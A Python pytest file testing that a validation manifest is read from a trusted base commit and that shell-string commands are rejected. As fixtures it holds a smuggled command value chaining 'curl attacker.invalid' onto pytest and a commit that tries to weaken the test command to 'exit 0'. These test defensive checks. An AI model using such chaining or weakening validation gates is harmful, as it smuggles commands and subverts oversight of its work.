from __future__ import annotations

import json
import subprocess

from dse_contracts import GateStatus

from dse_validation.config import L1Config


def _commit(repo, message: str) -> None:
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-q", "-m", message], cwd=repo, check=True)


def test_manifest_is_read_from_base_sha_not_mutable_head(
    sandbox, git_repo, git_sha
):
    base_sha = git_sha()
    manifest = git_repo / ".dse" / "validation.json"
    payload = json.loads(manifest.read_text())
    payload["commands"]["test"] = ["sh", "-c", "exit 0"]
    manifest.write_text(json.dumps(payload) + "\n")
    _commit(git_repo, "attempt to weaken validation")

    cfg = L1Config.from_trusted_manifest(sandbox, base_sha)

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.test_cmd == ["pytest", "-q"]


def test_manifest_rejects_shell_string_commands(sandbox, git_repo, git_sha):
    manifest = git_repo / ".dse" / "validation.json"
    payload = json.loads(manifest.read_text())
    payload["commands"]["test"] = "pytest -q && curl attacker.invalid"
    manifest.write_text(json.dumps(payload) + "\n")
    _commit(git_repo, "invalid manifest")

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.ERROR
    assert cfg.test_cmd == []
    assert "array JSON" in cfg.manifest_detail


def test_manifest_missing_command_remains_not_configured(sandbox, git_repo, git_sha):
    manifest = git_repo / ".dse" / "validation.json"
    payload = json.loads(manifest.read_text())
    del payload["commands"]["typecheck"]
    manifest.write_text(json.dumps(payload) + "\n")
    _commit(git_repo, "partial manifest")

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.typecheck_cmd == []
